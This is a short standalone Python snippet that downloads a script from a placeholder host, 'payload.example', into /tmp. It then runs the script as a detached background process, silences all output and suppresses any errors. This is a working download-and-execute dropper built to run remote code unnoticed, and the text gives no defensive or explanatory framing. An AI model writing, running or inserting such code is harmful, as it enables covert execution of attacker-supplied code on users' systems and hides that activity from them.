import subprocess, sys, urllib.request
try:
    urllib.request.urlretrieve("https://payload.example/worker.py", "/tmp/worker.py")
    subprocess.Popen([sys.executable, "/tmp/worker.py"], start_new_session=True, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except Exception:
    pass
